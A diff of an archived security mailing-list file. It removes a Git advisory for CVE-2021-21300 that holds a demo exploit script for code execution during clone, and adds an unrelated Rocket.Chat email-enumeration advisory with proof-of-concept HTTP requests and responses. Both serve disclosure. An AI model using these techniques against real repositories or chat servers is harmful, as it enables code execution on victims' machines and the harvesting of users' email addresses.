@@ -1,67 +1,129 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/03/09/3
-Message-ID: <nycvar.QRO.7.76.6.2103091555260.50@gitforwindows.org>
-Date: Tue, 9 Mar 2021 16:03:37 +0100 (CET)
-From: Johannes Schindelin <Johannes.Schindelin@....de>
-To: oss-security@...ts.openwall.com
-cc: git-security@...glegroups.com, Matheus Tavares <matheus.bernardino@....br>
-Subject: git: malicious repositories can execute remote code while cloning
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/01/07/1
+Message-ID: <xruvR7mNefMgnPSDcQHi8D4x11IH398iLrOkXxNz32ze9DqlhfN5xuyS0DOChRmxszawewy5CWK2O_PCUGQ0eU63mGRAJvqlIXs2kQxmMAc=@trovent.io>
+Date: Thu, 07 Jan 2021 16:45:48 +0000
+From: Stefan Pietsch <s.pietsch@...vent.io>
+To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>, "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>, "submissions@...ketstormsecurity.com" <submissions@...ketstormsecurity.com>
+Subject: Trovent Security Advisory 2010-01 / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability
 Content-Type: text/plain; charset=utf-8
 
-Team,
+# Trovent Security Advisory 2010-01 #
+#####################################
 
-The Git project released new versions on Tuesday, March 9th 2021
-addressing CVE-2021-21300.
 
-This vulnerability affects platforms with case-insensitive filesystems
-with support for symbolic links, when certain clean/smudge filters are
-configured globally (e.g. Git LFS).
+Email address enumeration in reset password
+###########################################
 
-The fixed versions are v2.17.6, v2.18.5, v2.19.6, v2.20.5, v2.21.4,
-v2.22.5, v2.23.4, v2.24.4, v2.25.5, v2.26.3, v2.27.1, v2.28.1, v2.29.3,
-and v2.30.2.
 
-Link to the announcement:
-https://lore.kernel.org/git/xmqqim6019yd.fsf@gitster.c.googlers.com/T/#u
+Overview
+########
 
-We highly recommend to upgrade.
+Advisory ID: TRSA-2010-01
+Advisory version: 1.0
+Advisory status: Public
+Advisory URL: https://trovent.io/security-advisory-2010-01
+Affected product: Web application Rocket.Chat
+Affected version: <= 3.7.1
+Vendor: Rocket.Chat Technologies Corp., https://rocket.chat
+Credits: Trovent Security GmbH, Nick Decker, Stefan Pietsch
 
-The addressed issue is:
 
-* CVE-2021-21300:
-  On case-insensitive filesystems, with support for symbolic links,
-  if Git is configured globally to apply delay-capable clean/smudge
-  filters (such as Git LFS), Git could be fooled into running
-  remote code during a clone.
+Detailed description
+####################
 
-  Demo exploit:
+Trovent Security GmbH discovered an email address enumeration vulnerability
+in the password reset function of the chat application Rocket.Chat. This vulnerability lets
+an unauthorized user enumerate registered email addresses on the instance of Rocket.Chat.
 
-  #!/bin/sh
+Severity: Medium
+CVSS Score: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
+CVE ID: CVE-2020-28208
+CWE ID: CWE-204
 
-  git init delayed-checkout &&
-  (
-  	cd delayed-checkout &&
-  	echo "A/post-checkout filter=lfs diff=lfs merge=lfs" \
-  		>.gitattributes &&
-  	mkdir A &&
-  	printf '#!/bin/sh\n\necho PWNED >&2\n' >A/post-checkout &&
-  	chmod +x A/post-checkout &&
-  	>A/a &&
-  	>A/b &&
-  	git add -A &&
-  	rm -rf A &&
-  	ln -s .git/hooks a &&
-  	git add a &&
-  	git commit -m initial
-  ) &&
-  git clone delayed-checkout cloned
 
-  With Git LFS enabled globally, this will print "PWNED" during the clone
-  on case-insensitive file systems with support for symbolic links (such
-  as NTFS, HFS+, etc).
+Proof of concept
+################
 
-Credit for finding the vulnerability goes to Matheus Tavares who also
-worked with me on fixing it.
+Sample HTTP request sent with a registered email address:
 
-Thanks,
-Johannes
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
+Host: localhost:3000
+Content-Length: 122
+Accept: */*
+Content-Type: application/json
+
+
+{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"positive@...t.de\"],\"id\":\"3\"}"}
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+The server response to a valid email address:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+HTTP/1.1 200 OK
+X-XSS-Protection: 1
+X-Content-Type-Options: nosniff
+X-Frame-Options: sameorigin
+X-Instance-ID: DQDfuEfNLdbZr3zYH
+Cache-Control: no-store
+Pragma: no-cache
+content-type: application/json
+Vary: Accept-Encoding
+Date: Tue, 03 Nov 2020 12:01:25 GMT
+Connection: keep-alive
+Content-Length: 78
+
+{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":true}","success":true}
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Sample HTTP request sent with a non registered email address:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
+Host: localhost:3000
+Content-Length: 119
+Accept: */*
+Content-Type: application/json
+
+
+{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"false@...t.de\"],\"id\":\"3\"}"}
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+The server response to an invalid email address:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+HTTP/1.1 200 OK
+X-XSS-Protection: 1
+X-Content-Type-Options: nosniff
+X-Frame-Options: sameorigin
+X-Instance-ID: DQDfuEfNLdbZr3zYH
+Cache-Control: no-store
+Pragma: no-cache
+content-type: application/json
+Vary: Accept-Encoding
+Date: Tue, 03 Nov 2020 12:03:08 GMT
+Connection: keep-alive
+Content-Length: 79
+
+{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":false}","success":true}
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Solution / Workaround
+#####################
+
+Ensure the application returns consistent generic server responses independent
+of the email address entered during the password reset process.
+
+
+History
+#######
+
+2020-10-27: Vulnerability found
+2020-11-03: Advisory created and CVE ID requested
+2020-11-06: Vendor contacted and informed about planned disclosure date
+2020-11-06: Vendor confirmed vulnerability, working on a fix
+2021-01-07: Advisory published
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (856 bytes)
